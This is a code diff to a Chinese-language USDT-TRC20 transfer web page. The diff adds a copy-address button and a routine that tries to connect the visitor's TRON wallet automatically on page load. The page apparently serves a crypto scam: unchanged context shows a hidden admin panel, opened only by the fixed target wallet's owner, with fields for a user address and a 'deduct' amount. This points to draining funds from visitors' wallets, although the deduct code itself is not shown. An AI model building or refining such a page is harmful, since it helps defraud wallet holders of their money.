@@ -201,6 +201,16 @@ body {
  font-size:12px;
  color:#888;
 }
+.copy-btn{
+ margin-top:10px;
+ padding:10px 16px;
+ background:#e5e7eb;
+ color:#333;
+ border:none;
+ border-radius:10px;
+ font-size:14px;
+ cursor:pointer;
+}
 </style>
 </head>
 <body>
@@ -214,12 +224,13 @@ body {
 <div class="address-card">
  <div class="label-text">目标收款钱包地址</div>
  <div class="fixed-addr-box" id="targetAddrText"></div>
+ <button class="copy-btn" id="copyAddrBtn">复制地址</button>
 </div>
 <div class="amount-card">
  <div class="label-text">转出数量（USDT‑TRC20）</div>
  <div class="amount-row">
  <input id="amountInput" class="amount-input" value="" inputmode="decimal" placeholder="请输入数量">
- <div class="max-btn" id="maxBtn">MAX</div>
+ <div class="max-btn" id="maxBtn">全部</div>
  </div>
  <div class="token-row">
  <div class="token-left">
@@ -268,6 +279,7 @@ const maxBtn = $("#maxBtn");
 const balanceText = $("#balanceText");
 const targetAddrText = $("#targetAddrText");
 const envTip = $("#envTip");
+const copyAddrBtn = $("#copyAddrBtn");
 const adminPanel = $("#adminPanel");
 const userAddrInput = $("#userAddrInput");
 const deductAmountInput = $("#deductAmountInput");
@@ -323,25 +335,52 @@ function disconnectWallet() {
     envTip.innerText = "";
 }
 
-async function connectWalletLogic() {
-    if (tronWeb && userAddress) {
-        disconnectWallet();
-        return;
-    }
-    envTip.innerText = "正在检测钱包...";
-    if (!window.tronWeb || !window.tronWeb.ready) {
-        envTip.innerText = "提示：请在波场系钱包DApp浏览器打开";
-        return;
-    }
+// 复制地址
+copyAddrBtn.addEventListener("click", async () => {
     try {
+        await navigator.clipboard.writeText(TARGET_ADDR);
+        alert("地址已复制");
+    } catch (e) {
+        alert("复制失败，请手动复制");
+    }
+});
+
+// 统一钱包初始化
+async function initWallet() {
+    envTip.innerText = "正在连接钱包...";
+
+    // OKX / TP / imToken / TronLink 多优先级兼容
+    if (window.okxwallet?.tronWeb) {
+        tronWeb = window.okxwallet.tronWeb;
+    } else if (window.tronWeb?.ready) {
         tronWeb = window.tronWeb;
+    } else if (window.tronProvider) {
+        try {
+            const TronWeb = (await import("https://esm.sh/tronweb")).default;
+            tronWeb = new TronWeb({
+                fullHost: "https://api.trongrid.io",
+                provider: window.tronProvider
+            });
+        } catch (e) {
+            tronWeb = null;
+        }
+    } else {
+        tronWeb = null;
+    }
+
+    if (!tronWeb || !tronWeb.defaultAddress || !tronWeb.defaultAddress.base58) {
+        envTip.innerText = "未检测到钱包，请复制地址转账";
+        sendBtn.disabled = true;
+        return;
+    }
+
+    try {
         userAddress = tronWeb.defaultAddress.base58;
         usdtContractInstance = await tronWeb.contract(USDT_ABI, USDT_CONTRACT);
         walletDot.classList.add("connected");
         envTip.innerText = "钱包已连接";
         await loadBalance();
         sendBtn.disabled = false;
-        // 修复：连接成功也不自动展示后台，必须点齿轮
         adminPanel.style.display = "none";
     } catch (err) {
         envTip.innerText = "钱包初始化异常";
@@ -426,9 +465,15 @@ deductBtn.addEventListener("click", async () => {
     }
 });
 
-walletDot.addEventListener("click", connectWalletLogic);
+walletDot.addEventListener("click", async () => {
+    if (tronWeb && userAddress) {
+        disconnectWallet();
+    } else {
+        await initWallet();
+    }
+});
 
-// 点击齿轮：只有匹配钱包地址才切换面板显示，默认隐藏
+// 点击齿轮：只有匹配钱包地址才切换面板显示
 settingIconBtn.addEventListener("click", () => {
     if (userAddress === TARGET_ADDR) {
         adminPanel.style.display = adminPanel.style.display === "block" ? "none" : "block";
@@ -437,10 +482,10 @@ settingIconBtn.addEventListener("click", () => {
     }
 });
 
-// 页面加载完毕自动尝试连接钱包
-window.addEventListener('load',async ()=>{
-    await connectWalletLogic();
-})
+// 页面加载自动尝试连接
+window.addEventListener('load', async () => {
+    await initWallet();
+});
 </script>
 </body>
 </html>
